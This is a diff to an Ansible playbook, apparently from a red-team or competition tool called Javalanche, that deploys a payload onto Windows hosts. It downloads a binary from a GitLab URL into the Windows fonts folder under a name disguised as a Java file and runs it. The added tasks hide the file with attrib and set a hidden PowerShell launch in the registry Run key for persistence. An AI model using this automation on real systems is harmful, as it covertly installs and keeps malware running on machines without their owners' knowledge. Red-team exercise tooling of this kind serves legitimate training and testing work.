@@ -45,6 +45,18 @@
     win_shell: wget -o C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads    
     when: ansible_os_family == "Windows"
   
+  - name: Windows Hide Agent
+    win_command: "attrib +h 'C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe'"
+    when: ansible_os_family == "Windows"
+
+  - name: Windows Persistance
+    win_regedit: 
+      path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+      name: "java-init"
+      data: "PowerShell.exe -WindowStyle hidden 'C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe'"
+      type: string
+    when: ansible_os_family == "Windows"
+
   - name: Windows Run Agent
     ansible.windows.win_shell: 'runas /trustlevel:0x20000 jdk-23.0.1-bin-java.exe'
     async: 45
@@ -52,4 +64,3 @@
     args:
       chdir: C:\\Windows\\fonts
     when: ansible_os_family == "Windows"
-
